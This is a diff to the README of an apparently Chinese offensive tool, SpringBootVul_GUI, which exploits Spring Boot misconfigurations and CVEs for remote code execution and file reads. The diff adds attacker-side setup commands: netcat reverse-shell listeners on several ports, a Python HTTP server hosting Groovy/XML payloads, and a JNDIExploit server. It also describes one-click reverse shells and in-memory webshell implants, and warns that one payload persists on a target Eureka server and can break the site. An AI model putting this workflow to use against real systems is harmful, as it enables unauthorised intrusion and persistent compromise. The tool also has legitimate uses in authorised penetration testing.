@@ -66,54 +66,32 @@ java -jar SpringBootVul_GUI.jar
 ## 0x03开发进度 TODO
 
 * [x] 配置不正当导致的泄露
-
 * [x] 脱敏密码明文(1)
-
 * [x] 增加漏洞利用选择模块，可以选择单一或多个漏洞进行检测
-
 * [x] 命令执行漏洞式支持交互式执行命令
-
 * [x] Spring Gateway RCE
-
 * [x] heapdump文件下载导致敏感信息泄露
-
 * [x] druid数据连接池
-
 * [x] 脱敏密码明文(2)
-
 * [x] 脱敏密码明文(3)
-
 * [x] eureka中xstream基于反序列化的RCE
-
 * [x] spring.datasource.data 基于h2数据库的RCE
-
 * [x] 基于SpEL注入的RCE
-
 * [x] spring.main.source的groovyRCE
-
 * [x] logging.config的groovyRCE
-
 * [x] H2数据库设置query属性的RCE
-
+* [x] logging.config的logback基于JNDI的RCE
+* [x] CVE-2021-21234任意文件读取
 * [ ] SpringCloud的SnakeYaml的RCE
-
 * [ ] jolokia中logback基于JNDI注入的RCE
-
 * [ ] jolokia中realm基于JNDI注入的RCE
-
 * [ ] h2数据库的控制台基于JNDI注入的RCE
-
 * [ ] mysql中jdbc基于反序列化的RCE
-
-* [ ] logging.config的logback基于JNDI的RCE
-
-  
 
 ## 0x04短期目标 Prepare
 
 * [x] 一键打入内存马(目前只有Spring Cloud Gateway)
-* [ ] 加入Bypass逻辑
-* [ ] 加入深度扫描任务
+* [ ] cve-2021-21234
 * [ ] 部分RCE的痕迹一键清除
 
 ## 0x05项目演示
@@ -148,6 +126,12 @@ java -jar SpringBootVul_GUI.jar
 
 直接点击getshell反弹，单纯poc测试的没写，python文件放同一目录下了，需要在vps启用2个端口，一个是你python服务器的端口，一个是反弹端口，写在python文件中，反弹端口默认是9000，注意这两个端口区别，输入框的端口是python端口
 
+```bash
+nc -lvk 9000 # mac
+nc -lvp 9000 # linux
+python -m http.server 80
+```
+
 **注意！！！**该数据包发送后会驻留到目标Eureka，会不断请求，若造成服务器出错时，可能会导致无法访问网站的路由
 
 ![](./image/image-20240911124128856.png)
@@ -161,6 +145,8 @@ java -jar SpringBootVul_GUI.jar
 输入框中填写你开启服务器的端口，目前为了能无限弹的机制，暂时只能设置在该项目的resources文件夹开启
 
 ```bash
+nc -lvk 8881 # mac
+nc -lvp 8881 # linux
 python -m http.server 80
 ```
 
@@ -173,6 +159,11 @@ python -m http.server 80
 http://127.0.0.1:9091/article?id=1'&b=2'
 
 getshell功能可以直接弹shell，getshell模块直接输入地址+路由+参数，无需加=和后面的值
+
+```bash
+nc -lvk port # mac
+nc -lvp port # linux
+```
 
 ![](./image/image-20240912201142594.png)
 
@@ -189,6 +180,8 @@ poc测试暂时没写，一键getshell监听的端口是托管groovy文件的端
 所以师傅有需要修改代码或者其他用途的时候，修改代码的时候不要改错groovy内容，并且文件内容也不要随意修改，以防万一
 
 ```bash
+nc -lvk 7777 # mac
+nc -lvp 7777 # linux
 python -m http.server 80
 ```
 
@@ -197,6 +190,12 @@ python -m http.server 80
 ### #7 LoggingConfigGroovyRCE
 
 poc测试暂时没写，一键getshell监听的端口是托管groovy文件的端口，反弹端口默认为4444，开启的方法同上
+
+```bash
+nc -lvk 4444 # mac
+nc -lvp 4444 # linux
+python -m http.server 80
+```
 
 **注意！！！**：“HTTP 服务器如果返回含有畸形 groovy 语法内容的文件，会导致程序异常退出”
 
@@ -208,15 +207,43 @@ poc测试暂时没写，一键getshell监听的端口是托管groovy文件的端
 
 这个也是跟H2dataSource漏洞一样，会使用sql语句来触发，考虑到无限弹shell并且如果一个网站同时测这两个漏洞，默认设置的含T5类似的，初始值是T15，代码写了递增，测试次数上要注意
 
+```bash
+nc -lvk 8000 # mac
+nc -lvp 8000 # linux
+```
+
 ![](./image/image-20240915232444633.png)
 
-### #9 端点扫描
+### #9 LoggingConfigJNDIRCE(慎用) 
+
+端口输入用的是托管xml文件的端口，监听默认9990，需要resources文件夹的jndi服务器配合一起。
+
+**注意**： 
+
+1、目标必须是出网的，否则 restart 会导致程序异常退出
+
+ 2、JNDI 服务返回的 object 需要实现javax.naming.spi.ObjectFactory`接口，否则会导致程序异常退出（已打包成jar包在resources文件夹）
+
+```bash
+nc -lvk 9990 # mac
+nc -lvp 9990 #linux
+python -m http.server 80 
+java -jar JNDIExploit-1.0-SNAPSHOT.jar -i ip
+```
+
+![](./image/image-20240921141501679.png)
+
+### #10 CVE-2021-21234任意文件读取
+
+![](./image/image-20240921163721471.png)
+
+### #11 端点扫描
 
 端点扫描经过延时降速处理，heapdump可以下载大文件，用了分块，做了个小进度条，以后优化下，textflow布局以后要改
 
 ![](./image/image-20240914013633068.png)
 
-### #10 一键上马
+### #12 一键上马
 
 ![](./image/WechatIMG1409.jpg)
 
